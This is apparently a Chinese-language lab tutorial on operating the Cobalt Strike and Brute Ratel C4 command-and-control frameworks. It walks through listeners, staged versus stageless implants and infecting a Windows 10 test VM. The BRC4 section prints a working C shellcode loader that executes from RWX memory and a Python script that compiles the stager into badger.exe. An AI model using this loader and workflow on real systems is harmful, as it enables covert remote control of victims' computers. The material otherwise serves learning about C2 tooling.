# CS 与 BRC4 使用指南

Cobalt Strike 与 Brute Ratel C4 都是 C2 框架，其基本功能是生成木马，并允许黑客对这些部署在靶机上，并且与 C2 服务器建立连接的木马进行操作。为了开发一个木马框架，我们有必要先体验一下 Cobalt Strike 或者 Brute Ratel C4 的使用，了解其大致特点。

## 一、Cobalt Strike

### 0x00 启动 teamserver

首先查看本机 IP 地址：

![1](.\image\1.png)

然后使用以下命令来启动 teamserver

![2](.\image\2.png)

其中，123456 是黑客客户端登入时所用的密码

### 0x01 开启黑客客户端

直接执行 cobaltstrike 脚本即可启动黑客客户端

![3](.\image\3.png)

这里的 Host 就是我们启动 teamserver 时输入的那个 IP 地址，也  Password 就是 123456，User 可以随便取

 Cobalt Strike 启动后的面板如下所示：

![4](.\image\4.png)

### 0x02 创建 Listener

Listener 就是用来远程与木马交互的东西。

![5](.\image\5.png) ![6](.\image\6.png) 

Listener 的表单项如下：

![7](.\image\7.png)

### 0x03 生成木马并感染 Windows

![8](.\image\8.png)

对于 Windows Executable 和 Windows Executable(S)，它们虽然生成的都是 exe 可执行文件，但它们实际上存在着显著的差异。这里的 (S) 实际上是 Stageless 的意思。
Windows Executable 相对于 Windows Executable(S)，文件体积较小，因为它**并不包含真正的木马代码**。当它被部署在宿主机上后，它会尝试与 C2 服务端（也就是我们之前启动的 teamserver）上的 Listener 进行连接，如果连接成功，它就会向 C2 请求真正的木马代码，然后 C2 将会向它发送完整的木马代码，最终完成木马的植入，这个过程就被称作**Stage**
而 Windows Executable(S) 本身就是完整的木马，因此不需要向 C2 请求真正木马的下载。在这里，“真正的木马代码”实际上就是那些用来实现木马具体功能的代码，例如文件目录读取、截屏、读取 ARP 表等功能，在实践中往往优先选择植入具有 Stage 机制的小木马。

在这里，我们选择生成 Windows Executable，其表单如下：

![9](.\image\9.png)

选择一个 Listener 后，点击 Generate 即可生成木马程序文件。

在一个能与 Kali 通往的 Windows 10 虚拟机中双击它运行即可

![10](.\image\10.png) ![11](.\image\11.png)

在 Cobalt strike 的黑客面板中也可以观察到木马的上线

![12](.\image\12.png) 点击 Interact 即可与木马进行交互

尝试使用一个 ls 命令：

![13](.\image\13.png)

## 二、Brute Ratel C4

BRC4 与 CS 的架构非常相似。

### 0x00 启动 C2 服务器

![14](.\image\14.png)

其中，`-ratel` 参数表示以 C2 服务端模式启动，`-a` 是用户名，`-p` 是密码，`-h` 是 ip+端口，`-sc` 和 `-sk` 是在进行任何 SSL 连接（无论是黑客接入 C2 服务端还是与木马交互时）使用的证书和私钥（可以自己使用 OpenSSL 生成自签名证书）

### 0x01 开启黑客客户端

![15](.\image\15.png)

登入后的面板如下所示：

![16]( .\image\16.png)

### 0x02  创建 Listener

![17](.\image\17.png)

创建 Listener 时的表单项如下所示：

![18](.\image\18.png)

其中，Rotational hosts 是木马上线时尝试连接的 IP 地址，Listener bind host 是 Listener 的真实 IP 地址，也就是说，部署木马时，可以选择对木马的网络路径进行中转，利用诸如 SSH 转发等手段。Port 是木马上线时连接的端口，这里与木马通信使用的协议是 HTTPS，因此端口选择 443。Useragent, header, URI 则是一些用来伪装成 HTTP 协议的东西，SSL 表示与木马交互时是否使用 SSL 加密，如果选择 Yes，则实际的通信可以看作是 HTTPS，否则就是 HTTP。

### 0x03 生成木马并感染 Windows

与 Cobalt Strike 不同，Brute Ratel C4 的 Stage 模式需要手动开启：

![19](.\image\19.png)

同时也可以选定传输的 Beacon（即所谓“完整的木马”）是哪个 Listener 的木马，这就是说，一个 Stage 模式的木马，与它部署在靶机上之后下载过来的完整木马，所连接的 Listener 可以是不同的。

![20](.\image\20.png)

跟着便来生成 Stage 模式的 Payload

![21](.\image\21.png)

这里我们选择的是 `RtlExitUserThread`

与 Cobalt Strike，BRC4 的 stage 模式并不直接生成 exe 可执行文件，而是一段 shellcode，是一段二进制形式的、位置无关（即无论将其加载到什么地址上，它都可以正确执行）的机器指令。因此，我们需要手动将其打包成一个可执行文件。

首先在一个文件夹下创建一个 `shellcode.c` 文件：

```c
#include "shellcode.h"

int main() {
    LPVOID shellcode_ptr = VirtualAlloc(NULL, SHELLCODE_SIZE, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(shellcode_ptr, SHELLCODE_BUFFER, SHELLCODE_SIZE);
    ((void(*)())shellcode_ptr)();
}
```

然后将 BRC4 生成的这个 `stage_x64_rtl.bin` 放入同目录，然后在这个目录下执行以下脚本：

```python
import os

def headerFileContent(shellcode):
    code =  '#include<windows.h>\n'
    code += '#include<stdio.h>\n\n'
    code += 'int SHELLCODE_SIZE = {};\n\n'.format(len(shellcode))
    code += 'unsigned char SHELLCODE_BUFFER[] = \"'
    for i in shellcode:
        c = hex(i)[2:]
        if len(c) == 1:
            c = '0' + c
        c = c.upper()
        code += '\\x' + c
    code += '\";'
    return code

def main():
    f = open('./stage_x64_rtl.bin', 'rb')
    shellcode = f.read()
    f.close()

    f = open('./shellcode.h', 'w')
    f.write(headerFileContent(shellcode))
    f.close()
    
    os.system('x86_64-w64-mingw32-gcc -o badger.exe shellcode.h shellcode.c')

if __name__ == '__main__':
    main()
```

在 windows 靶机上执行生成出来的 `badger.exe` 

![22](.\image\22.png)

可在 BRC4 面板中观察到木马的上线：

![4](.\image\23.png)

尝试对其执行 ls 命令：

![24](.\image\24.png)